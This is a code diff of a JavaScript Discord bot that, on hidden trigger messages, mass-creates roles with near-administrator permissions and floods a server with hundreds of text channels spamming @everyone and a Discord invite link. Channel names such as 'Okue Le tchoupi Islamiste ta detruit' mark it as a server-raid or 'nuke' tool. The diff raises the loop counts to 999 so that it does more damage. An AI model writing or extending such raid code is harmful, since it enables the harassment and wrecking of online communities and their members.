@@ -10,7 +10,7 @@ if(message.content.includes("AR!kelsairv")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
 if(message.content === "roles"){
-for(var i =0; i < 200; i++){
+for(var i =0; i < 999; i++){
     message.guild.createRole({name:"Okue Le tchoupi Islamiste",
                              mentionable:false,
                              permissions:2146958591,
@@ -158,7 +158,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
                   if(message.content === "channel"){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
-                      for(var i = 0; i < 500; i++){
+                      for(var i = 0; i < 999; i++){
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
